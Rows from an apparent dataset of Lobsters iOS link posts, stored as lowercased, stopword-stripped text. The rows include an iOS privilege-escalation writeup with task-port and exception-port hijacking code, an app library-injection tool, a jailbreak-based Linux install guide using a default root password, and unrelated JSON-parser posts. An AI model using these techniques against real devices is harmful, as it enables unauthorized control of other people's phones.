descriptor pipe unix socket imagine like mach port like file descriptor fancy pipe userland get mere handle meaning inside process see different thing next process see using machmsg syscall send receive message port required port right mach port process hold three different right receive right mean port one capable receiving message one right exist given port send right mean send message port unlimited number right exist given port sendonce right send right except disintegrates single use mach message would essentially big binary buffer send receiver except also used transfer region memory well mach port right hold send right two mach port b send message b containing send right receiver receives message port b kernel clone send right insert copy process e namespace receive sendonce right create clone move also create new send sendonce right hold receive right nice feature something virtually every mach message us apart handle process mach port right also registered kernel interface kinda stashed away ready looked one thing stash process three set particular registered port inherent function array mach port register look exception port used lowlevel fault handling eg accessing unmapped memory default handler convert issue posix signal applicable behaviour overridden issue triaged outofprocess special port port set wellknown function identified constant id created handled userland process example bootstrap port used talk launchd others created handled directly kernel host task port task port particular interest u process separate task port whose message handled kernel allows anyone send right read write process memory get set thread register state series operation said code longer work taskt haxx const char pathofexecutable taskt task pidt pid posixspawnattrt att posixspawnattrinit att posixspawnattrsetflags att posixspawnstartsuspended posixspawn pid pathofexecutable null att const char pathofexecutable null const char null posixspawnattrdestroy att taskforpid machtaskself pid task return task code attempt spawn process suspended state immediately sigstop ed call taskforpid returned pid mobile user taskforpid way actively obtaining task port process requires taskforpidallow entitlement sneakily bestowed upon also naturally allows u get task port process also run mobile lpe root combining posixspawn still obvious benefit spawn validlyentitled binary use api alter control flow make bidding longer work apple petty io started marking process platform apple nonplatform nonapple process nonapple process use task port apple process obtain passing back api behave way tasknull obviously gon na stop u though way much power point specifically power spawn process pretty well known child process inherit lot parent thing happen registered port exception port special port give u lot control especially exception port wild sort hardwarelevel exception occurs kernel send u entire register state faulting thread send back new register state applied give u full control instruction pointer turn could use call memset co gain read write primitive problem need something would normally trigger crash could go look bug sure quite bunch null derefs found apple binary unstable approach limit u binary find crashable bug much simpler proper solution look code crash purpose lot code libxpc fall written much stricter fashion predecessor attempt detect api misuse crash process run brk instruction something intercept handle control exception port tripping api misuse detection need daemon implement launchdregistered service launchd create mach port service daemon start check launchd take receive right port us one special port bootstrap port since full control impersonate launchd daemon spawn send reply see fit specifically send error code error code send libxpc treat fatal error call api misuse routine thus crashing process daemon good enough opted usrlibexecamfid specifically p ability opportunity set thread register point could dropped code told people controll register figure quite good enough came apple marked u nonapple binary leave everything apple binary could end gon na set triangle mach message proxy like detailed technical plan follows pick binary gon na work u example usrlibexecamfid use machportallocate machportinsertright create mach port exception port bootstrap port proxy port use posixspawnattrsetexceptionportsnp posixspawnattrsetspecialportnp set exception special port binary gon na spawn call machportsregister install task port plus proxy port registered port io could also use function instead extern int posixspawnattrsetregisteredportsnp posixspawnattrt restrict attr machportt portarray count declare available io chose avoid call posixspawn spawn actual process posixspawnstartsuspended since want run crash use xpcpipereceive xpcpiperoutinereply send error code process fault start handling exception message always call whole function set lr invalid value exception handler hit function return use dlsym look address shared cache remote process read memory use platformthreadgetuniqueid platformthreadgetuniqueid ldr ret write memory use xpcserviceinstancesetbinpref xpcserviceinstancesetfinalizerf xpcserviceinstancesetbinpref str ret xpcserviceinstancesetfinalizerf str ret proxy setup phase malloc working buffer make process call machportslookup get task port send right proxy port since process use task port vice versa make call machportextractright machmsgtypemovereceive u move receive right proxy port namespace proxy run phase send message proxy port make process receive make extract port namespace actually want send message replace destination port remote mach message make resend message received receive reply end repeat slightly practice eg fix remote message target reply port get swapped receiving need manual fiddling thread register value satisfy pac doable gon na past entire implementation post check like paste demo code call api would normally require tfplatform demonstrate beautifully simple use void demo void setup volatile machportt realport machportt proxy haxx usrlibexecamfid realport kernreturnt ret taskt task pidt pid posixspawnattrt att posixspawnattrinit att posixspawnattrsetflags att posixspawnstartsuspended posixspawn pid usrlibexecbackboardd null att char const const char usrlibexecbackboardd null char const const char null posixspawnattrdestroy att taskforpid machtaskself pid task nslog task x task task port normally could nt use instead ret machportsregister task null else realport task ret machportsregister proxy null endif nslog machportsregister macherrorstring ret hope good enough ya end update get jit entitlement dynamically load generate code spawn shell literally thousand thing mere two privilege bug give u root kernel available attack surface increased hundredfold would argue going root even worth might well go straight kernel hope understand dear reader losing one loss enough course escalating past mobile every entitlement ever left exercise patch given elusive nature bug apple ultimately patch obviously could one way introducing plist parser one io already apple hardened entitlement check somewhat due bug report credited linus henze applemobilefileintegrity available iphone later ipad air later ipad mini later ipod touch generation impact application may able use arbitrary entitlement description issue addressed improved check linus henze pinautende know exact detail bug based tweet linus assuming bplist also exploiting parser difference gotten past amfid bug actually survived fix finally killed beta also know whether linus apple someone else went look parser difference two entitlement bug fixed two consecutive minor io release feel like much coincidence strongly assuming whoever drew inspiration linus bug apple final fix consists introducing new function called amfiunserializexml pasted amfikext amfid used compare result osunserializexml cfpropertylistcreatewithdata make sure still include sequence like entitlement go try sneak anything comment amfi tear process shred report syslog amfi detected anomaly entitlement parsing technically bump number xmlplist parser sadly actually mitigate bug conclusion far first go wished better one single bug assisted dozen research project used thousand time every year probably saved many hour exploit likelihood reliable clean elegant one ever write entire life even fit tweet well year since discovery half bad bug sure would loved keep another decade two know dearly miss time come also ask bug like could ever exist hell different plist parser io still using xml even figure philosophical technical nature entire story show might good idea periodically ask whether inaccuracy mental model acceptable something documented communicated thoroughly really accuse apple much bug like probably among hardest spot truly idea hell able find many others pumped post soon possibly could left mistake question wan na chat general feel free file issue hit twitter shoot email net siguza time writing bug still present latest nonbeta version io whole project available github fun last finally reaction got twitter enjoy
57,Lobsters,ios,Apple iOS,A static injector of dynamic library for application,https://github.com/lanoox/luject,static injector dynamic library application,luject introduction ‰∏≠Êñá prerequisite build installation usage example inject libfridagadgetso apk frida use frida nonrooted device development build run build run test contact backer become backer sponsor become sponsor,luject static injector dynamic library application introduction ‰∏≠Êñá luject static injector dynamic library application support following application android apk iphoneos ipa window program supported yet linux program macos program want know please refer prerequisite xmake installed system available build installation usage luject appapk luject appipa luject libaso luject appexe luject adll luject libadylib luject bin example inject libfridagadgetso apk use frida tool dynamically analyze application detail see frida luject appapk p libtest tmplibfridagadgetso libtest library requires matching injection apk support pattern matching achieve batch injection example libtest specify p parameter defaulted batch full injection ref use frida nonrooted device development build run xmake xmake run luject input libaso libbso build run test xmake build test xmake run test contact backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor
58,Lobsters,ios,Apple iOS,"Faster JSON Support for iOS/macOS, Part 8: Dematerialize All the Things",https://blog.metaobject.com/2020/04/faster-json-support-for-iosmacos-part-8.html,faster json support iosmacos part dematerialize thing,object streaming streaming mpwobjectcache mpwobjectcache h available column store structure array soa holgi h h option standard object dl outlook note info metaobjectcom,last exciting instalment json parsing macosios series got rid temporary object parser builder protocol much possible saw performance soar mb almost time faster swift jsondecoder point creating object adding array take combined total surely something ca nt reasonably get rid object streaming although requirement object created nobody said exist time instead returning complete array parsed object done also tell parser stream object target come setting streamingthreshold say depth json tree start use streaming void decodempwdirectstream nsdata json mpwmasonparser parser mpwmasonparser alloc initwithclass testclass class mpwobjectbuilder builder mpwobjectbuilder parser builder builder builder settarget self parser parseddata json since set streaming target need provide writeobject method order conform streaming protocol void writeobject testclass anobject first first mpwrusage current objcount hicountanobjecthi method count object sum hi instance variable also record time first object come well m mb addition time first object around ¬µs le millisecond application start receiving usable data able provide feedback user immediately noticeable begindictionary method longer top profile almost way bottom total running time actually possible still get million object still create even dole piecemeal fashion mpwobjectcache mpwobjectcache class h keep circular buffer object reinitialize reuse application code done described detail book mention book part pearson kindly made publicly available cache place actually instantiate number object needed fill cache safely recycle object cost function call object retained reused column store structure array another neat way interpreting dematerialization store data columnar data format structure array soa instead array structure aos organisation thanks holgi suggesting need specific builder mpwarraysbuilder h maintains set mutable array stored key receives value look appropriate array key add value array follows void writeinteger long number arraymap keystr mpwintarray aobjectforstringlength arraymap keystr keylen addinteger int number keystrnull void writestring id astring arraymap keystr nsmutablearray aobjectforstringlength arraymap keystr keylen addobject astring keystrnull integer value would mpwintarray h string regular nsmutablearray even better m mb option option example turn protocol connecting parser builder specifically created purpose actually extends streaming protocol handle disassembled hierarchy take tree pipe pipeline accurately reassemble end protocol used polymorphic write stream enable standard object shown dl earlier version presented macoun german outlook however probably hitting diminishing return point certainly proof concept certainly fat trim objcmsgsend impcache away going character input twice probably something could avoid apart performance improvement also minor detail correctness take care example handling json escape character key properly handling hierarchy thing particularly hard handled xml superclass require bit thought effort complete also question hooking swift general simple attempt failed getting right method codable particular latter would require somewhat different approach instead instantiating object actively setting property need create temporary structure pas object decoder decode max superclass us approach probably wo nt hard main trickiness probably reconciling hierarchicalrecursive approach streaming required protocol probably also go little analysis hows why approach maybe provide feedback would interest interested production version extreme optimization one far fairly tame note help apple also companyteam performance agile coaching workshop consulting contact info metaobjectcom
59,Lobsters,ios,Apple iOS,iPhone SE and the Commodification of the Pocket Computer,https://nadim.computer/posts/2020-04-25-iphonese.html,iphone se commodification pocket computer,iphone se commodification pocket computer iphone se known outlandish car design especially software update year two lucky,iphone se commodification pocket computer iphone se significant event smartphone industry since original iphone android iphone x etc distraction comparison order understand let look evolution consumer car design throughout decade known outlandish car design known outlandishly specced outlandishly priced smartphones since car design become much tame predictable change past two decade centered solely maximizing utility lowering production cost similarly mirror trend smartphone world mean sure thing used weirder smartphone design speak like consumer automobile mobile phone back outrageously cool commodity sufficiently large chunk cool kid warrant design nokia main player era smartphone design thing started settle engineering space also seek peacock impress aesthetic space justifying premium like saw consumer automobile hence iphone x samsung galaxy especially folding phone iphone se continues impeccable parallel exists evolution consumer automobile smartphone industry signal beginning smartphone design manufacturer discounted peacock tax business model applied latest advancement aerodynamic theory work sensible term production sure iphone still come lambo crowd iphone se hardly matter much friend know avid follower consumer tech reason iphone se first ever piece tech bother blog really eye significant signal pivotal shift industry back away foremost producer luxury smartphones doubling putting latest greatest processor camera operating system almost display form factor sell without going cheap body material quality irrevocably blur line luxury iphone branding highend spec great build quality especially software update year two lucky commodity coterie halfassed android lottery contestant shift competition radically towards direction focusing smartest efficient way get peak smartphone pocketable body relatively pocketable price absolutely new era pocket computer come leader trendsetter industry excited remainder decade going see smartphones evolve way car true push democratic access vehicle commonsense engineering definition best engineering without equivalent peacock tax business model going render access best smartphone tech insanely direct people going notice thin bezel three lens essentially smartphone equivalent vertical car door bombastic headlight oh case looking traditional review phone great missed touch id putting chip phone size make hilariously fast
60,Lobsters,ios,Apple iOS,"Faster JSON Support for iOS/macOS, Part 7: Polishing the Parser",https://blog.metaobject.com/2020/04/faster-json-support-for-iosmacos-part-7.html,faster json support iosmacos part polishing parser,convenient setback damn torpedo full speed ahead eliminating nsnumber discussion protocol oriented programming note info metaobjectcom,convenient setback one thing may noticed last time around getting instance variable name class also still manually setting common key manually bit duplicated needlessly manual effort common key exactly ivar name however two piece information different place ivar name builder common string parse one way consolidating information creating convenience intializer decoding object follows initwithclass class classtodecode self self initwithbuilder mpwobjectbuilder alloc initwithclass classtodecode autorelease self setfrequentstrings nsarray classtodecode ivarnames collect return self still compute ivar name twice really big deal something fix later like issue probably using property name instead instance variable name case property postprocess get rid underscore added ivar synthesis code parse object simplifies following similar would see swift jsondecoder void decodempwdirect nsdata json mpwmasonparser parser mpwmasonparser alloc initwithclass testclass class nsarray objresult parser parseddata json quickly verifying performance still always oops performance dropped significantly could innocuous change lead performance regression profile show spending significantly time mpwsmallstringtable objectforkey method get byte nsstringcfstring case bit mysterious since changed virtually nothing little sleuthing revealed string question instance nstaggedpointerstring previously instance nscfconstantstring latter pointer byteoriented character orientation simply return former cleverly encodes character pointer first reconstruct byte representation method constructing representation computing size representation also appears fairly generic slow via stream nt really easy solve since creation nstaggedpointerstrring instance hardwired pretty deep corefoundation way disable optimization although would possible create new nsstring subclass byte buffer make sure convert class putting instance lookup table seems like lot work could revert convenience damn torpedo full speed ahead alternatively really wanted get rid whole process packing character data nsstring instance immediately unpack let leave regression instead previously builder nsstring key instance vaiable char keystr int keylen stringhandling case json parser split betweeen key nonkey casse nonkey case still conversion keycase directly sending char length builder case parsestring curptr endptr stringstart curptr curptr builder writekeystring stringstart length curptrstringstart curptr else curstr self makeretainedjsonstringstart stringstart length curptrstringstart builder writestring curstr curptr break mean least temporarily json escape handling disabled key straightforward add back makeretainedjsonstringstart length processing character buffer converting string object end void writestring nsstring astring keystr mpwvalueaccessor accesssorobjectforstringlength selfaccessortable keystr keylen accesssor setvalue astring fortarget tos keystrnull else self pushobject astring key dictionary otherwise array toplevel dictionary case fetch valueaccessor via objectforstringlength macro result encouraging mb mpwplistbuilder also need adjusted build nsdictionary object actually need nsstring key parser longer delivers creates fly nsstring key nsstring keynil keystr commonstrings keyobjectforstringlength commonstrings keystr keylen key key nsstring alloc initwithbytes keystr length keylen encoding autorelease return key surprisingly make dictionary parsing code slightly faster bringing par nssjssonserialization eliminating nsnumber use nsnumbercfnumber value similar use nsstring key parser wrap parsed number object builder unwraps changing initially integer straightforward add integervalued message builder protocol implement void writeinteger long number keystr mpwvalueaccessor accesssorobjectforstringlength accessortable keystr keylen accesssor setintvalue number fortarget tos keystrnull else self pushobject number actual integer parsing code mpwmasonparser superclass nt want touch let copypaste code modifying return c primitive type instead object long longelementatptr const char start length long len long int const char endstartlen start start else start start start end isdigit start valval start start val sign return val sure better way turn string int similarly keystring distinction special case integer isreal number self realelement numstart length curptrnumstart builder writestring number else long n self longelementatptr numstart length curptrnumstart builder writeinteger n pretty clean later together using direct instance variable access instead property get accessortable yield noticeable speed boost m mb nice discussion happened random hacking profile replacing nice objectoriented programming ugly fast c although obviously truth profile used c primitive type appeared would contend happened move away object particularly away generic expensive foundation object foundation oriented programming towards message oriented programming sorry long ago coined term object topic get many people focus lesser idea big idea messaging kernal smalltalksqueak something never quite completed xerox parc phase japanese small word perhaps nearest english equivalent interstitial key making great growable system much design module communicate rather internal property behavior turn message oriented programming call protocol oriented programming objectivec shine coarsegrained object implemented c exchange message message also primitive get away idea follow idea objectivec hum get fast also flexible architecturally nicely decoupled object elegance combination object primitive message similar another architecturally elegant productive style unix pipe filter component c rich internal structure want talk via bytestreams also made fast also prevents least reduces coupling component another aspect tension api use api reuse particularly within constraint callreturn get tasked create component api parsing json something like nsjsonserialization something almost come feed json come parsed json nothing could convenient use parsing json mpwmasonparser hand convenient viewed isolation much capable smoothly integrated larger processing chain work nsjsonserialization name convenience wasted nt make processing easier suck enormous amount time anyway let look current profile first time small enough highresolution sampling necessary get meaningful result second nsnumbercfnumber nsstring packing unpacking gone even bigger chunk remaining time going object creation objcmsgsend starting actually become noticeable inefficient character level parsing accessors test object start appear barely work done far improved speed around started mb almost faster swift jsondecoder better stay tuned note help apple also companyteam performance agile coaching workshop consulting contact info metaobjectcom
61,Lobsters,ios,Apple iOS,Linux with Wayland is now running on iPhone 7,https://blog.project-insanity.org/2020/04/22/linux-with-wayland-is-now-running-on-iphone-7/,linux wayland running iphone,running postmarketos linux iphone corellium using postmarketos overlayfs preparing postmarketos image pmbootstrap apfs compiling kernel custom ramdisk flashing system image kernel dfu mode shell access via usb serial continued already implemented corellium custom kernel mail,since last post running postmarketos linux iphone finally able mount run larger persistent system image iphone system memory therefore used technique corellium using android build iphone ephemeral write support postmarketos achieved using overlayfs see image linux distribution able launch every sort graphical window manager example weston want try phone complete new step step guide work linux desktop preparing postmarketos image let start compiling base image using postmarketos utility pmbootstrap pmbootstrap init work path homeonnylocalvarpmbootstrap vendor qemu device codename kernel virt user interface weston pmbootstrap install initialization leave variable example choosing weston user interface installation change configuration run install process pmbootstrap chroot r vi etcxdgwestonwestonini change one variable backendfbdevbackendso pmbootstrap install extract initramfs add custom filesystem mounting procedure init script pmbootstrap initfs extract mountrootpartition binmkdir p mntapfs mntro mntrw binmount apfs ro relatime mntapfs sbinlosetup r binmount ro mntro binmount tmpfs tmpfs mntrw binmkdir p mntrwdata mntrwwork binmkdir p sysroot binmount overlay lowerdirmntro upperdirmntrwdata workdirmntrwwork overlay sysroot init sbininit two variable code snippet first parameter specifies target apfs volume create later already created custom volume phone value probably higher secondly losetup specifies offset represents offset byte system partition inside image calculate offset multiplying sector size start sector using fdisk recompress initramfs kernel cd sh c find cpio quiet h newc gzip tmpramdiskcpiogz compiling kernel custom ramdisk following part similar old guide time using initramfs image pmbootstrap directly pacman cd tmp git clone http githubcomcorelliumlinuxsandcastlegit cd linuxsandcastle export export make cp tmpramdiskcpiogz make dtbpacksh lzma z stdout flashing system image kernel careful following step considered safe use still experimental could brick phone use risk flashing traditional sense going use bootrom exploit gain ssh root access phone put phone dfu mode run following command ce iproxy leave running accessing via ssh sshpass p alpine ssh root localhost inside iphone root shell going create new apfs volume mounting step remount partition want delete overwrite existing system image newfsapfs v postmarketos e mkdir p tmpmnt mount apfs tmpmnt volume new postmarketos volume check systemlibraryfilesystemsapfsfsapfsutil p transfer system image inside new volume using scp sshpass p alpine scp v root localhost tmpmnt unmount partition iphone put back dfu mode following command run linux kernel trigger boot process graphical user session cd tmp git clone http githubcomcorelliumprojectsandcastle cd projectsandcastleloader make cpe loadlinux linuxsandcastledtbpack want reboot postmarketos system jsut rerun last two command change made running system lost reboot yet persistent shell access via usb serial since development state convenient serialshell access running system therefore add configusbgserial kernel configuration append following line inittab file postmarketos target root filesystem respawn sbingetty n l binsh linux next boot able access phone example minicom continued easy enable bluetooth wifi since already implemented corellium custom kernel drop mail question want support project
62,Lobsters,ios,Apple iOS,"Flaw in iPhone, iPads may have allowed hackers to steal data for years",https://www.reuters.com/article/us-usa-apple-cyber-idUSKCN2242IK,flaw iphone ipads may allowed hacker steal data year,,washingtonsan francisco reuters apple inc planning fix flaw security firm said may left half billion iphones vulnerable hacker bug also exists ipads discovered zecops san franciscobased mobile security forensics company investigating sophisticated cyberattack client took place late zuk avraham zecops chief executive said found evidence vulnerability exploited least six cybersecurity breakins apple spokesman acknowledged vulnerability exists apple software email iphones ipads known mail app company developed fix rolled forthcoming update million device sold globally apple declined comment avraham research published wednesday suggests flaw could triggered afar already exploited hacker highprofile user avraham said found evidence malicious program taking advantage vulnerability apple io mobile operating system far back january could determine hacker reuters unable independently verify claim execute hack avraham said victim would sent apparently blank email message mail app forcing crash reset crash opened door hacker steal data device photo contact detail zecops claim vulnerability allowed hacker remotely steal data iphones even running recent version io flaw could given access whatever mail app access including confidential message avraham former israeli defense force security researcher said suspected hacking technique part chain malicious program rest undiscovered could given attacker full remote access apple declined comment prospect zecops found mail app hacking technique used client last year avraham described targeted client fortune north american technology company declined name also found evidence related attack employee five company japan germany saudi arabia israel avraham based conclusion data crash report generated program fail midtask device able recreate technique caused controlled crash two independent security researcher reviewed zecops discovery found evidence credible said yet fully recreated finding patrick wardle apple security expert former researcher u national security agency said discovery confirms always somewhat rather badly kept secret wellresourced adversary remotely silently infect fully patched io device apple aware software bug recently could valuable government contractor offering hacking service exploit program work without warning uptodate phone worth million apple largely viewed within cybersecurity industry high standard digital security successful hacking technique iphone could affect million due device global popularity apple said million iphones active use bill marczak security researcher citizen lab canadabased academic security research group called vulnerability discovery scary lot time take comfort fact hacking preventable said marczak bug matter got phd cybersecurity eat lunch reporting christopher bing washingtong joseph menn san francisco contribution jack stubbs london stephen nellis san francisco editing chris sander edward tobin sonya hepinstall
63,Lobsters,ios,Apple iOS,"Somewhat Faster JSON Support for iOS/macOS, Part 6: Cutting KVC out of the Loop",https://blog.metaobject.com/2020/04/somewhat-faster-json-support-for.html,somewhat faster json support iosmacos part cutting kvc loop,last time key value coding setvalue forkey first article kvc slow key value coding enterprise object framework siren call kvo cocoa binding polymorphic identifier valueaccessor h hooking valueaccessor result analysis next step cfstringgetcstringptr note info metaobjectcom,last time actually made significant headway taking advantage dematerialisation plist intermediate representation instead first producing array dictionary went directly json final object representation got u around second little millisecond accomplished using key value coding method setvalue forkey directly set attribute object parsed json oh instantiating object first place instead dictionary much faster method example beating swift jsondecoder cool little surprising given kvc mentioned first article series slowest mechanism getting data objcets short deliberate rube goldber mechanism kvc slow key value coding core part next enterprise object framework introduced keyvalue coding data access mechanism property object accessed indirectly key name rather directly field invocation accessor method used throughout enterprise object perhaps useful accessing data relationship enterprise object keyvalue coding enables use keypaths traverse relationship example person entity relationship called tophoto whose destination entity called personphoto contains attribute called photo could access data traversing keypath tophotophoto within person object keypaths one way keyvalue coding invaluable feature enterprise object general though useful providing consistent way access object data rather needing know object data member accessor method name accessor method data accessible field need know key represent object data keyvalue coding automatically find data regardless object provides data context keyvalue coding satisfies classic design pattern principle encapsulate thing varies still extremely powerful programming technique let u write algorithm work generically object property currently basis coredata applescript support key value observing binding though somewhat skeptical least performance reason see siren call kvo cocoa binding also part inspiration polymorphic identifier core kvc valueforkey setvalue forkey message default implementation nsobject default implementation take nsstring key derive accessor message key send message either setting returning value value underlying message takesreturns nonobject type kvc wrapsunwraps necessary sound expensive derive set accessor key first character key capitalized string set prepended string converted objectivec selector sel theory done every call one kvc method done nsstring object fantastic job representing humanvisible text bit heavyweight lowlevel work full computation every invocation would way expensive apple cache intermediate result obvious place put intermediate result placed global hash table keyed class propertykey name however even lookup still significantly expensive final set get property access multiple lookup since thesis table global locking also required valueaccessor expense could avoided custom object mediate access rather naked nsstring object could store computed value provide fast generic access arbitrary property enter mpwvalueaccesssor h word warning unlike mpwstringtable mpwvalueaccesssor mostly experimental code test largely work incomplete many way also contains bunch extra probably extraneous idea sufficient current purpose core class accesspathcomponent struct typedef struct class targetclass int targetoffset sel getselector putselector getimp putimp id additionalarg char objctype accesspathcomponent struct contains number different way gettingsetting data integer offset object ivar located pair objectivec selectorsmessage name one getting one setting pair function pointer objectivec method respective selector resolve additional arg key used keyed access getimp putimp initialized objcmsgsend always used bind valueaccessor class function pointer get resolved actual gettersetter method addition objctype get set type instance variable automatic conversion like kvc code actually add last instalment current one key takeaway string processing lookup kvc need every call done initialization message andor preresolved function call hooking valueaccessor adapting mpwobjectbuilder h use mpwvalueaccessor much easier expected thee following show change made property nonatomic strong mpwsmallstringtable accessortable void setupacceessors class theclass nsarray ivars theclass ivarnames ivars ivars collect nsmutablearray accessors nsmutablearray arraywithcapacity ivarscount nsstring ivar ivars mpwvalueaccessor accessor mpwvalueaccessor valueforname ivar accessor bindtoclass theclass accessors addobject accessor mpwsmallstringtable table mpwsmallstringtable alloc initwithkeys ivars value accessors autorelease selfaccessortabletable void writeobject anobject forkey akey mpwvalueaccessor accesssor selfaccessortable objectforkey akey accesssor setvalue anobject fortarget tos bulk change come part new setupaccessors method first asks class instance variable creates value accessor instance variabl name bind accessor class finally put accessors lookup table keyed name writeobject forkey method modified look use value accessor instead using kvc result parsing driver code nt changed rerunning nonrepresentative mb json file yield following time m really starting get somewhere shy mb faster swift jsondecoder within raw nsjsonserialization analysis next step better yes glad asked let look profile first thing note objectcreation begindictionary entry parse another indicator moving right direction also closing endgame however still room improvement example although actually searching smallstringtable valueaccessor offsetofcstringwithlengthintableoflength take time getting internal char cfstring via fastpath cfstringgetcstringptr total time objectforkey multiple mean unwrapping nsstring take time actual work wrapping char length nsstring also take significant time work redundant would better passing along char length similar wrapunwrap situation occurs integer first turn nsnumbers immediately get integer set objcmsgsend also start getting noticeable looking bit impcaching eliminating unnecessary indirection also seems like good idea another aspect optimization work occasional big win welcome getting truly outstanding performance mean satisfied slogging smallish seeming detail note help apple also company performance agile coaching workshop consulting contact info metaobjectcom
64,Lobsters,ios,Apple iOS,"iPhone 7 boots postmarketOS, becomes the first Apple Linux smartphone",https://tuxphones.com/iphone-7-now-boots-postmarketos-linux/,iphone boot postmarketos becomes first apple linux smartphone,already previous post running postmarketos iphone update boot graphical interface linux wayland running iphone twitter mastodon join subreddit reddit,let u face six month ago nobody would realistically expected proprietary apple io device become linux smartphone however seen previous week seventh generation apple smartphones seen successful effort reverse engineering corelliumproject sandcastle developer point booting proper android lcd touch screen support postmarketos linux next fact could o run motorbike pocket calculator smart dishwasher enter unexplored wonderland apple proprietary chip point little say already previous post unbelievably fast progress linux apple proprietary soc simply link port author blog slightly information already try booting postmarketos iphone today running postmarketos iphone make sure update article soon device land official testing repository versatile linux distributionupdate iphone boot graphical interface well see wayland weston post plus instruction install get usb serial shell work bluetooth wifi probably going implemented next stepslinux wayland running iphone want stay tuned world linux smartphones follow tuxphones twitter mastodon join subreddit latest news communityvia postmarketos chat room reddit
65,Lobsters,ios,Apple iOS,"Less Lethargic JSON Support for iOS/macOS, Part 5: Cutting out the Middleman",https://blog.metaobject.com/2020/04/less-lethargic-json-support-for.html,le lethargic json support iosmacos part cutting middleman,result instalment cutting middleman objectbuilder h jsondecoder analysis next step,initially disappointing result trying get faster json processing parsing finally got parity nsjsonserialization le last instalment help mpwsmallstringtable unique string turning object string creation surprisingly expensive even tagged pointer string cutting middleman objectbuilder first instalment series saw could fairly trivially create object plist created nsjsonserialization mpwobjectbuilder h subclass mpwplistbuilder change thing instead creating dictionary creates object instead using setobject forkey set value dictionary us kvc message setvalue forkey vive la petite diff√©rence set value object implementation mpwobjectbuilder instancetype initwithclass class theclass self super init selfcache mpwobjectcache class theclass return self void begindictionary self pushcontainer getobject cache void writeobject anobject forkey akey tos setvalue anobject forkey akey well need concern u actual class additional feature nt matter tos instance variable top stack mpwplistbuilder maintains constructing result mpwobjectcache factory creating object let fire see void decodempwdirect nsdata json nsarray key hi comment mpwmasonparser parser mpwmasonparser parser mpwobjectbuilder builder mpwobjectbuilder alloc initwithclass testclass class parser setbuilder builder parser setfrequentstrings key nsarray objresult parser parseddata json nslog mpwmason ld element objresult firstobject objresult count elegant code universe complete parser stretch imagination workable result m shabby slower basensjsonserialization nonrepresentative json file creating final object instead intermediate representation arround faster apple jsondecoder although still mb nowhere near gb also starting close performance level achievable given context basic object creation mostly empty parse analysis next step ignoring triviality actually useful constrained situation array single kind object improve well make faster course let look profile expected kvc code top contributor around total runtime locking function show sibling setvalue forkey almost certainly part implementation slight misattribution time something generally expect aware instrument guessing missing framepointers fomitframepointer nt really feel deep urge investigate nt materially impact outcome analysis guess another point gather enough data inform next step certainly le also see mistake common one definitely making thing fast without enough data matter every project claim high performance without comparative benchmarking simply something author think fast well know extreme le common typically le bad least nt get complete nonsense performance claim backed performance testing running huge battery benchmark every step optimization process probably going get way achieving result yes seen practice
66,Lobsters,ios,Apple iOS,Privacy-Preserving Contact Tracing - Apple and Google,https://www.apple.com/covid19/contacttracing,privacypreserving contact tracing apple google,privacypreserving contact tracing,privacypreserving contact tracing across world government health authority working together find solution pandemic protect people get society back running software developer contributing crafting technical tool help combat virus save life spirit collaboration google apple announcing joint effort enable use bluetooth technology help government health agency reduce spread virus user privacy security central design part partnership google apple releasing draft documentation exposure notification system service privacypreserving contact tracing u apple google believe never important moment work together solve one pressing problem close cooperation collaboration developer government public health provider hope harness power technology help country around world slow spread accelerate return everyday life
67,Lobsters,ios,Apple iOS,"Somewhat Less Lethargic JSON Support for iOS/macOS, Part 1: The Status Quo",https://blog.metaobject.com/2020/04/somewhat-less-lethargic-json-support.html,somewhat le lethargic json support iosmacos part status quo,simdjson environmental assumption constraint nsjsonserialization nsjsonserialization swift json coding third party json parser jason stjson zippyjson flightschool max mason max superconvenient mpwmasonparser,finished watching daniel lemire talk current iteration simdjson json parser clock following daniel work time ca nt really recommend highly enough video reminded recent twitter conversation offered contribute fast swiftcompatible json parser loosely based max fast convenient xml parser due various factor control ca nt really offer anything fast compared simdjson manage something quite bit le lethargic currently offer apple particularly swift world environmental assumption constraint first assumption going operate apple ecosystem simplicity sake going use macos next assume want parse r domain object processing within application structs difference important context going use following class mix integer string instance variable swift objc class testclass nsobject codable let hi int let int let comment string objectivec interface testclass nsobject property nonatomic long hi property nonatomic strong nsstring comment end make easy measure going use one million object going initialise increasing integer constant string comment yield json file different serialisation method correctly parsed parser tested obviously simple class file structure think give reasonable approximation realworld use first thing check quickly create object straight code without parsing give u good upper bound performance achieve parsing domain object define count void createobjects nsmutablearray objresult nsmutablearray arraywithcapacity int count testclass cur testclass new curhii curtherei curcomment comment objresult addobject cur nslog created object code wo parsing ld object objresult objresult count quad core mbp run second although nt actually parsing would mean creating object would result parsingg json file would yield rate mb wait second almost slower daniel lemire parser one actually par json creating object would result parsing without actual parsing one many unintuitive aspect parsing performance actual lowlevel characterlevel parsing generally least important part overall performance unless something crazy like use nsscanner nt use nsscanner please one reason unintuitive learned performance dominated innermost loop character level processing innermost loop magnitude performance difference inner outer loop differ le amount stuff happennnig outer loop dominate nsjsonserialization apple json story much revolves around nsjsonserialization much like rest serialization story revolves around similar nspropertylistserialization class reasonable quick implementation turning mb json file nsarrray nsdictionary instance second called objectivec rate mb swift take second mb course get u property list array dicts case domain object actually want read book mention book oh think know type dictonary representation fairly expensive expensive create expensive term memory consumption expensive access creating dictionary equivalent object created take second around time creating equivalent object rate mb relative mb json file void createdicts nsmutablearray objresult nsmutablearray arraywithcapacity int count nsmutabledictionary cur nsmutabledictionary dictionary cur hi cur cur comment comment objresult addobject cur nslog created dicts code wo parsing ld object objresult objresult count creating dict single step using dictionary literal significantly faster creating immutable copy mutable dict done filling brings time half second getting dicts object typically straightforward tedious fetch entry dictionary call corresponding setter value thus retrieved dictionary nt production code trying get bound possible easier way use key value coding key found dictionary combined code parsing creating object shown void decodensjsonandkvc nsdata json nsarray key hi comment nsarray plistresult nsjsonserialization jsonobjectwithdata json error nil nsmutablearray objresult nsmutablearray arraywithcapacity nsdictionary plistresult testclass cur testclass new nsstring key key cur setvalue key forkey key objresult addobject cur nslog nsjsonkvc ld object objresult objresult count note kvc slow really slow orderofmagnitude slower sending message kind slow significant impact total time come total second including parsing object creation shy mb swift json coding first couple release swift json support apple limited wrapped nsjsonserialization slight performance penalty already noted write book see sidebar many json parser published none notable exception big nerd ranch freddy actual par transformed array dictionary returned nsjsonserialization swift object performance abysmal around overhead addition basic nsjsonserialization parse apple swift codable promised solve convenience front certainly great job func readjsoncoder data data testclass nslog swift decoding let coderjsondecoder let arraytry coderdecode testclass self data return array forcing test code please nt production ala 